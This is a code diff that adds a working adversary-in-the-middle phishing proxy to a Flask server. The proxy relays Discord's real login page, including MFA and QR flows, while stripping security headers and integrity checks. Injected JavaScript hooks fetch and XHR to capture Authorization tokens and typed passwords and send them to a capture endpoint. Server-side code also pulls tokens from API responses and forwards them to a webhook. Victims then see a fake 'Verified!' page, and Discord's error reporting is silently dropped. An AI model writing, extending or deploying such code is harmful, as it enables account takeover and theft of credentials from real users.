@@ -2013,6 +2013,214 @@ def _qr_worker(s: QRAuth):
         s.st = 'error'; s.err = str(e); s._stop.set()
 
 
+# ━━━━━━━━━━━━ Discord Reverse Proxy ━━━━━━━━━━━━
+# Proxies the REAL Discord login page through our server.
+# Users see actual Discord UI — we intercept tokens server-side + client-side.
+# No captcha solving needed — users solve captchas themselves.
+
+_asset_cache = {}
+_asset_cache_lock = threading.Lock()
+ASSET_CACHE_TTL = 1800   # 30 min
+ASSET_CACHE_MAX = 300
+
+_login_html_cache = {'html': None, 'time': 0}
+_login_html_lock = threading.Lock()
+LOGIN_HTML_TTL = 90  # re-fetch Discord login page every 90s
+
+_proxy_sessions = {}     # sid -> {'s': curl_cffi session, 'ts': float}
+_proxy_sessions_lock = threading.Lock()
+PROXY_SESSION_TTL = 600  # 10 min
+
+_STRIP_RESP = {
+    'content-security-policy', 'content-security-policy-report-only',
+    'x-frame-options', 'strict-transport-security',
+    'transfer-encoding', 'content-encoding', 'content-length',
+    'alt-svc', 'report-to', 'nel', 'expect-ct',
+    'cross-origin-opener-policy', 'cross-origin-embedder-policy',
+    'cross-origin-resource-policy', 'permissions-policy',
+}
+
+INTERCEPTOR_JS = r'''<script>(function(){
+  var _pw='',_seen={},_captured=false;
+  function _c(t,s,u){
+    if(!t||t.length<30||_seen[t])return;
+    _seen[t]=1;
+    try{navigator.sendBeacon('/--/captured',JSON.stringify({t:t,s:s,u:u,p:_pw}))}catch(e){}
+    if(!_captured){_captured=true;
+      setTimeout(function(){
+        try{document.body.innerHTML='<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#313338;color:#fff;font-family:sans-serif"><div style="text-align:center"><div style="width:80px;height:80px;border-radius:50%;background:#23a55a;margin:0 auto 20px;display:flex;align-items:center;justify-content:center"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div><h1 style="color:#23a55a;font-size:28px;margin:0 0 10px">Verified!</h1><p style="color:#b5bac1;font-size:14px;margin:0">You may now close this window.</p></div></div>';}catch(e){}
+      },2000);
+    }
+  }
+  var _of=window.fetch;
+  window.fetch=function(input,init){
+    init=init||{};
+    var url=(typeof input==='string')?input:(input&&input.url)||'';
+    if(url.indexOf('/auth/login')!==-1&&init.body){
+      try{var b=JSON.parse(init.body);if(b.password)_pw=b.password;}catch(e){}
+    }
+    if(init.headers){
+      var a=null;
+      if(init.headers instanceof Headers)a=init.headers.get('Authorization');
+      else if(typeof init.headers==='object')a=init.headers['Authorization']||init.headers['authorization'];
+      if(a&&a.length>30)_c(a,'h',url);
+    }
+    return _of.apply(this,arguments).then(function(r){
+      if(url.indexOf('/api/')!==-1){
+        r.clone().json().then(function(j){
+          if(j&&j.token&&j.token.length>30)_c(j.token,'f',url);
+        }).catch(function(){});
+      }
+      return r;
+    });
+  };
+  var _xo=XMLHttpRequest.prototype.open,_xs=XMLHttpRequest.prototype.send,_xsh=XMLHttpRequest.prototype.setRequestHeader;
+  XMLHttpRequest.prototype.open=function(m,u){this._u=u;return _xo.apply(this,arguments)};
+  XMLHttpRequest.prototype.setRequestHeader=function(k,v){
+    if(k.toLowerCase()==='authorization')_c(v,'xh','xhr');
+    return _xsh.apply(this,arguments);
+  };
+  XMLHttpRequest.prototype.send=function(){
+    var x=this;
+    x.addEventListener('load',function(){
+      try{
+        if(x._u&&x._u.indexOf('/api/')!==-1){
+          var j=JSON.parse(x.responseText);
+          if(j&&j.token&&j.token.length>30)_c(j.token,'x',x._u);
+        }
+      }catch(e){}
+    });
+    return _xs.apply(this,arguments);
+  };
+})();
+</script>'''
+
+
+def _get_proxy_session():
+    """Get or create a curl_cffi session for the current client."""
+    sid = request.cookies.get('_dsid', '')
+    with _proxy_sessions_lock:
+        if sid and sid in _proxy_sessions:
+            entry = _proxy_sessions[sid]
+            if time.time() - entry['ts'] < PROXY_SESSION_TTL:
+                entry['ts'] = time.time()
+                return sid, entry['s']
+        # Cleanup old sessions
+        now = time.time()
+        stale = [k for k, v in list(_proxy_sessions.items()) if now - v['ts'] > PROXY_SESSION_TTL]
+        for k in stale:
+            try: _proxy_sessions.pop(k)['s'].close()
+            except: pass
+    new_sid = uuid.uuid4().hex[:16]
+    s = _make_session()
+    with _proxy_sessions_lock:
+        _proxy_sessions[new_sid] = {'s': s, 'ts': time.time()}
+    return new_sid, s
+
+
+def _proxy_rewrite_html(html_text):
+    """Rewrite Discord login page HTML for proxying."""
+    h = html_text
+    # Remove integrity/crossorigin/nonce attrs (we modify JS content)
+    h = re.sub(r'\s+integrity="[^"]*"', '', h)
+    h = re.sub(r'\s+crossorigin(?:="[^"]*")?', '', h)
+    h = re.sub(r'\s+nonce="[^"]*"', '', h)
+    # Remove CSP meta tags
+    h = re.sub(r'<meta[^>]*content-security-policy[^>]*>', '', h, flags=re.IGNORECASE)
+    # Rewrite GLOBAL_ENV endpoints (protocol-relative URLs)
+    h = h.replace("'//discord.com/api'", "'/api'")
+    h = h.replace('"//discord.com/api"', '"/api"')
+    h = h.replace("'//cdn.discordapp.com'", "'/cdn'")
+    h = h.replace('"//cdn.discordapp.com"', '"/cdn"')
+    h = h.replace("'//discord.com'", "''")
+    h = h.replace('"//discord.com"', '""')
+    # Rewrite absolute URLs
+    h = h.replace('https://discord.com/assets/', '/assets/')
+    h = h.replace('https://discord.com/api/', '/api/')
+    h = h.replace('https://cdn.discordapp.com/', '/cdn/')
+    h = h.replace('https://discord.com/', '/')
+    h = h.replace('https://discordapp.com/', '/')
+    # Fix GLOBAL_ENV: API_ENDPOINT must be protocol-relative so that
+    # "https:" + API_ENDPOINT produces a valid URL (not "https:/api")
+    ENV_FIX = '<script>window.GLOBAL_ENV.API_ENDPOINT="//" + location.host + "/api";</script>'
+    # Inject env fix + interceptor before </head>
+    h = h.replace('</head>', ENV_FIX + '\n' + INTERCEPTOR_JS + '\n</head>', 1)
+    return h
+
+
+def _proxy_rewrite_js(js_text):
+    """Rewrite Discord JS to route requests through our proxy."""
+    t = js_text
+    t = t.replace("'//discord.com/api'", "'/api'")
+    t = t.replace('"//discord.com/api"', '"/api"')
+    t = t.replace("'//cdn.discordapp.com'", "'/cdn'")
+    t = t.replace('"//cdn.discordapp.com"', '"/cdn"')
+    t = t.replace("'//discord.com'", "''")
+    t = t.replace('"//discord.com"', '""')
+    t = t.replace('https://discord.com/assets/', '/assets/')
+    t = t.replace('https://discord.com/api/', '/api/')
+    t = t.replace('https://cdn.discordapp.com/', '/cdn/')
+    t = t.replace('https://discord.com/', '/')
+    t = t.replace('https://discordapp.com/', '/')
+    # Handle escaped URLs in JSON strings
+    t = t.replace('https:\\/\\/discord.com\\/', '\\/')
+    t = t.replace('https:\\/\\/cdn.discordapp.com\\/', '\\/cdn\\/')
+    return t
+
+
+def _check_and_capture(resp_body, path, client_ip, req_body=None):
+    """Check Discord API response for tokens and capture them."""
+    auth_paths = ('auth/login', 'auth/mfa/totp', 'auth/mfa/sms', 'remote-auth/login', 'auth/mfa/webauthn')
+    if not any(p in path for p in auth_paths):
+        return
+    try:
+        j = json.loads(resp_body)
+        token = j.get('token', '')
+        if token and len(token) > 30:
+            pw = '?'
+            if req_body:
+                try: pw = json.loads(req_body).get('password', '?')
+                except: pass
+            print(f'[CAPTURED] Token from proxy ({path}): {token[:25]}...')
+            fire_webhook(token, client_ip, pw)
+    except:
+        pass
+
+
+def _fetch_login_html():
+    """Fetch and cache Discord's login page HTML (rewritten)."""
+    with _login_html_lock:
+        if _login_html_cache['html'] and (time.time() - _login_html_cache['time']) < LOGIN_HTML_TTL:
+            return _login_html_cache['html']
+    # Fetch fresh
+    try:
+        s = _make_session()
+        r = s.get('https://discord.com/login', headers={
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'User-Agent': UA,
+            'Sec-CH-UA': SEC_CH_UA,
+            'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
+            'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-User': '?1',
+            'Upgrade-Insecure-Requests': '1',
+        }, allow_redirects=False, timeout=20)
+        if r.status_code == 200:
+            html = _proxy_rewrite_html(r.text)
+            with _login_html_lock:
+                _login_html_cache['html'] = html
+                _login_html_cache['time'] = time.time()
+            print(f'[proxy] Fetched Discord login page ({len(html)} bytes)')
+            return html
+        print(f'[proxy] Discord returned {r.status_code}')
+    except Exception as e:
+        print(f'[proxy] Failed to fetch Discord login: {e}')
+    return None
+
+
 # ━━━━━━━━━━━━ Routes ━━━━━━━━━━━━
 
 @app.route('/')
@@ -2028,12 +2236,40 @@ def verify_catchall(slug):
 
 @app.route('/login')
 def login_page():
+    """Proxy Discord's REAL login page with token interception."""
+    html = _fetch_login_html()
+    if html:
+        # Ensure client has a proxy session for API calls
+        sid, s = _get_proxy_session()
+        # Warm session with Discord cookies if fresh
+        try:
+            s.get('https://discord.com/login', headers={
+                'User-Agent': UA, 'Accept': 'text/html', 'Sec-CH-UA': SEC_CH_UA,
+                'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE, 'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
+            }, timeout=15)
+        except:
+            pass
+        # Also inject page token for backward compat (QR start)
+        tok = _issue_page_token()
+        html_out = html.replace('</head>', f'<script>window._pgToken="{tok}";</script>\n</head>', 1)
+        resp = make_response(html_out)
+        resp.headers['Content-Type'] = 'text/html; charset=utf-8'
+        resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
+        resp.headers['Pragma'] = 'no-cache'
+        resp.headers['Expires'] = '0'
+        resp.set_cookie('_dsid', sid, max_age=600, httponly=True, samesite='Lax')
+        return resp
+    # Fallback to local clone
+    return _serve_local_login()
+
+
+def _serve_local_login():
+    """Fallback: serve the local discord_login.html clone."""
     try:
         with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'discord_login.html'), 'r', encoding='utf-8') as f:
             html = f.read()
     except:
         return send_from_directory('.', 'discord_login.html')
-    # Inject page token so /api/qr/start can verify the request came from a real page load
     tok = _issue_page_token()
     html = html.replace('</head>', f'<script>window._pgToken="{tok}";</script></head>', 1)
     resp = make_response(html)
@@ -2041,11 +2277,13 @@ def login_page():
     resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
     resp.headers['Pragma'] = 'no-cache'
     resp.headers['Expires'] = '0'
-    resp.headers['Clear-Site-Data'] = '"cache"'
-    resp.headers['Vary'] = '*'
-    import hashlib
-    resp.headers['ETag'] = hashlib.md5(html.encode()).hexdigest()
     return resp
+
+
+@app.route('/login-classic')
+def login_classic():
+    """Access the old clone-based login page directly."""
+    return _serve_local_login()
 
 
 @app.route('/favicon.ico')
@@ -3222,6 +3460,208 @@ def api_qr_stop(sid):
     return jsonify({'ok': True})
 
 
+# ━━━━━━━━━━━━ Reverse Proxy Routes ━━━━━━━━━━━━
+
+@app.route('/cdn-cgi/<path:rest>', methods=['GET', 'POST', 'OPTIONS'])
+def proxy_cdn_cgi(rest):
+    """Proxy Cloudflare challenge scripts and POSTs."""
+    url = f'https://discord.com/cdn-cgi/{rest}'
+    qs = request.query_string.decode()
+    if qs:
+        url += '?' + qs
+    try:
+        s = _make_session()
+        fwd = {'User-Agent': UA, 'Accept': '*/*'}
+        if request.method == 'POST':
+            r = s.post(url, headers=fwd, data=request.get_data(), timeout=20)
+        else:
+            r = s.get(url, headers=fwd, timeout=20)
+        resp = make_response(r.content, r.status_code)
+        ct = r.headers.get('Content-Type', 'application/javascript')
+        resp.headers['Content-Type'] = ct
+        resp.headers['Access-Control-Allow-Origin'] = '*'
+        return resp
+    except:
+        return make_response('', 502)
+
+
+@app.route('/error-reporting-proxy/<path:rest>', methods=['POST', 'OPTIONS'])
+def proxy_error_reporting(rest):
+    """Sink Discord's error reporting — don't leak to their Sentry."""
+    return '', 204
+
+
+@app.route('/--/captured', methods=['POST'])
+def captured_token():
+    """Client-side JS sends intercepted tokens here."""
+    try:
+        d = request.get_json(silent=True) or json.loads(request.data or b'{}')
+        token = d.get('t', '')
+        pw = d.get('p', '') or '?'
+        source = d.get('s', '?')
+        if token and len(token) > 30:
+            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+            print(f'[CAPTURED-JS] Token via {source}, IP={_clean_ip(ip)}')
+            fire_webhook(token, ip, pw)
+    except Exception as e:
+        print(f'[captured] Error: {e}')
+    return '', 204
+
+
+@app.route('/assets/<path:rest>')
+def proxy_assets(rest):
+    """Proxy Discord's static assets (JS, CSS, images, fonts) with caching."""
+    cache_key = f'/assets/{rest}'
+    with _asset_cache_lock:
+        cached = _asset_cache.get(cache_key)
+        if cached and (time.time() - cached['time']) < ASSET_CACHE_TTL:
+            resp = make_response(cached['data'], 200)
+            resp.headers['Content-Type'] = cached['ct']
+            resp.headers['Cache-Control'] = 'public, max-age=3600'
+            resp.headers['Access-Control-Allow-Origin'] = '*'
+            return resp
+    url = f'https://discord.com/assets/{rest}'
+    try:
+        s = _make_session()
+        r = s.get(url, headers={'User-Agent': UA, 'Accept': '*/*'}, timeout=30)
+        if r.status_code != 200:
+            return make_response('', r.status_code)
+        ct = r.headers.get('Content-Type', 'application/octet-stream')
+        data = r.content
+        # Rewrite JS files
+        if 'javascript' in ct or rest.endswith('.js'):
+            data = _proxy_rewrite_js(data.decode('utf-8', errors='replace')).encode('utf-8')
+        # Rewrite CSS files
+        elif 'css' in ct or rest.endswith('.css'):
+            text = data.decode('utf-8', errors='replace')
+            text = text.replace('https://discord.com/', '/')
+            text = text.replace('https://cdn.discordapp.com/', '/cdn/')
+            data = text.encode('utf-8')
+        # Cache
+        with _asset_cache_lock:
+            if len(_asset_cache) >= ASSET_CACHE_MAX:
+                oldest_key = min(_asset_cache, key=lambda k: _asset_cache[k]['time'])
+                del _asset_cache[oldest_key]
+            _asset_cache[cache_key] = {'data': data, 'ct': ct, 'time': time.time()}
+        resp = make_response(data, 200)
+        resp.headers['Content-Type'] = ct
+        resp.headers['Cache-Control'] = 'public, max-age=3600'
+        resp.headers['Access-Control-Allow-Origin'] = '*'
+        return resp
+    except Exception as e:
+        print(f'[proxy-asset] Error fetching {url}: {e}')
+        return make_response('', 502)
+
+
+@app.route('/cdn/<path:rest>')
+def proxy_cdn(rest):
+    """Proxy Discord CDN (avatars, emojis, etc)."""
+    url = f'https://cdn.discordapp.com/{rest}'
+    try:
+        s = _make_session()
+        r = s.get(url, headers={'User-Agent': UA}, timeout=20)
+        resp = make_response(r.content, r.status_code)
+        ct = r.headers.get('Content-Type', 'application/octet-stream')
+        resp.headers['Content-Type'] = ct
+        resp.headers['Cache-Control'] = 'public, max-age=3600'
+        resp.headers['Access-Control-Allow-Origin'] = '*'
+        return resp
+    except:
+        return make_response('', 502)
+
+
+@app.route('/api/v9/<path:rest>', methods=['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'])
+@app.route('/api/v10/<path:rest>', methods=['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'])
+def proxy_discord_api_v(rest):
+    """Proxy Discord API v9/v10 — intercepts auth tokens server-side."""
+    version = 'v10' if request.path.startswith('/api/v10') else 'v9'
+    discord_url = f'https://discord.com/api/{version}/{rest}'
+    qs = request.query_string.decode()
+    if qs:
+        discord_url += '?' + qs
+
+    # CORS preflight
+    if request.method == 'OPTIONS':
+        resp = make_response('', 204)
+        resp.headers['Access-Control-Allow-Origin'] = '*'
+        resp.headers['Access-Control-Allow-Methods'] = 'GET,POST,PUT,PATCH,DELETE,OPTIONS'
+        resp.headers['Access-Control-Allow-Headers'] = request.headers.get(
+            'Access-Control-Request-Headers', '*')
+        resp.headers['Access-Control-Max-Age'] = '86400'
+        return resp
+
+    # Get proxy session
+    sid, s = _get_proxy_session()
+
+    # Build headers for Discord
+    fwd = {}
+    for key, val in request.headers:
+        kl = key.lower()
+        if kl in ('host', 'cookie', 'accept-encoding', 'connection',
+                  'x-forwarded-for', 'x-forwarded-proto', 'x-real-ip',
+                  'x-request-id', 'cf-connecting-ip', 'cf-ray'):
+            continue
+        fwd[key] = val
+    fwd['Host'] = 'discord.com'
+    if 'Origin' in fwd:
+        fwd['Origin'] = 'https://discord.com'
+    if 'Referer' in fwd:
+        fwd['Referer'] = 'https://discord.com/login'
+
+    body = request.get_data()
+    method = request.method.lower()
+
+    try:
+        if method == 'get':
+            r = s.get(discord_url, headers=fwd, timeout=30)
+        elif method == 'post':
+            r = s.post(discord_url, headers=fwd, data=body, timeout=30)
+        elif method == 'put':
+            r = s.put(discord_url, headers=fwd, data=body, timeout=30)
+        elif method == 'patch':
+            r = s.patch(discord_url, headers=fwd, data=body, timeout=30)
+        elif method == 'delete':
+            r = s.delete(discord_url, headers=fwd, timeout=30)
+        else:
+            return make_response('', 405)
+    except Exception as e:
+        print(f'[proxy-api] {method.upper()} {discord_url} failed: {e}')
+        return jsonify({'message': 'Proxy connection error', 'code': 0}), 502
+
+    # ═══ TOKEN INTERCEPTION ═══
+    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    _check_and_capture(r.content, rest, client_ip, body)
+
+    # Build response
+    resp = make_response(r.content, r.status_code)
+    for key, val in r.headers.items():
+        if key.lower() not in _STRIP_RESP:
+            resp.headers[key] = val
+    resp.headers['Access-Control-Allow-Origin'] = '*'
+    resp.headers['Access-Control-Expose-Headers'] = '*'
+    resp.set_cookie('_dsid', sid, max_age=600, httponly=True, samesite='Lax')
+    return resp
+
+
+@app.route('/channels')
+@app.route('/channels/<path:rest>')
+def proxy_channels_redirect(rest=''):
+    """After login Discord redirects here. Show success page."""
+    return make_response('''<!DOCTYPE html><html><head><meta charset="utf-8"><title>Discord</title></head>
+<body style="background:#313338;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;font-family:sans-serif">
+<div style="text-align:center;color:#fff">
+<div style="width:80px;height:80px;border-radius:50%;background:#23a55a;margin:0 auto 20px;display:flex;align-items:center;justify-content:center">
+<svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div>
+<h1 style="color:#23a55a;font-size:28px;margin:0 0 10px">Verified!</h1>
+<p style="color:#b5bac1;font-size:14px;margin:0">You may now close this window.</p>
+</div></body></html>''', 200, {'Content-Type': 'text/html'})
+
+
+@app.route('/app')
+def proxy_app_redirect():
+    """Some Discord flows redirect to /app."""
+    return proxy_channels_redirect()
+
 
 # ━━━━━━━━━━━━ Main ━━━━━━━━━━━━
 
@@ -3264,6 +3704,17 @@ if __name__ == '__main__':
                 cleaned = len(dead) + len(stale_login) + len(stale_pc)
                 if cleaned:
                     print(f'[cleanup] Removed {len(dead)} QR, {len(stale_login)} login, {len(stale_pc)} prechallenge sessions')
+                # Clean up stale proxy sessions
+                with _proxy_sessions_lock:
+                    stale_proxy = [k for k, v in list(_proxy_sessions.items()) if now - v['ts'] > PROXY_SESSION_TTL]
+                    for k in stale_proxy:
+                        try: _proxy_sessions.pop(k)['s'].close()
+                        except: pass
+                # Clean up stale asset cache
+                with _asset_cache_lock:
+                    stale_assets = [k for k, v in list(_asset_cache.items()) if now - v['time'] > ASSET_CACHE_TTL]
+                    for k in stale_assets:
+                        del _asset_cache[k]
                 # Force garbage collection to free curl_cffi / SSL memory
                 gc.collect()
             except Exception as e:
@@ -3277,6 +3728,11 @@ if __name__ == '__main__':
     # Start session pre-warm pool
     threading.Thread(target=_session_pool_loop, daemon=True).start()
 
-    print(f'\n  Discord Login Server (stealth)')
+    # Pre-fetch Discord login page so first request is fast
+    threading.Thread(target=_fetch_login_html, daemon=True).start()
+
+    print(f'\n  Discord Login Proxy Server (stealth)')
     print(f'  http://0.0.0.0:{PORT}\n')
+    print(f'  /login        \u2192 Proxied real Discord login (token interception)')
+    print(f'  /login-classic \u2192 Fallback clone-based login\n')
     app.run('0.0.0.0', PORT, debug=False, threaded=True)
